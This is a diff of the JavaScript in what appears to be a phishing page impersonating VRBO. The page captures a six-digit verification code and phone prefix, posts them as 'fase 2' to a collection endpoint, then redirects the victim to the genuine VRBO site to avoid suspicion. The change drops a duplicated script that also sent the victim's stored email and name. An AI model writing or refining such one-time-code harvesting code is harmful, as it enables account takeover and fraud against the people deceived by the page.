@@ -103,43 +103,13 @@
     btnConfirm.disabled = true;
     loader.classList.add('is-visible');
 
-    const correo = sessionStorage.getItem('vrbo_correo') || '';
-    const nombre = sessionStorage.getItem('vrbo_nombre') || '';
-    const lada   = sessionStorage.getItem('vrbo_lada')   || '';
+    const lada   = sessionStorage.getItem('vrbo_lada') || '';
     const numero = verifyInput.value;
 
     fetch('/api/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ correo, nombre, lada, numero })
-    }).finally(() => {
-      setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
-    });
-  });
-</script><script>
-  const verifyInput = document.getElementById('verifyCode');
-  const btnConfirm = document.getElementById('btn-confirm');
-  const loader = document.getElementById('page-loader');
-
-  verifyInput.addEventListener('input', function() {
-    this.value = this.value.replace(/[^0-9]/g, '');
-    btnConfirm.disabled = this.value.length !== 6;
-  });
-
-  document.getElementById('verify-form').addEventListener('submit', (e) => {
-    e.preventDefault();
-    btnConfirm.disabled = true;
-    loader.classList.add('is-visible');
-
-    const correo = sessionStorage.getItem('vrbo_correo') || '';
-    const nombre = sessionStorage.getItem('vrbo_nombre') || '';
-    const lada   = sessionStorage.getItem('vrbo_lada')   || '';
-    const numero = verifyInput.value;
-
-    fetch('/api/send', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ correo, nombre, lada, numero })
+      body: JSON.stringify({ lada, numero, fase: '2' })
     }).finally(() => {
       setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
     });
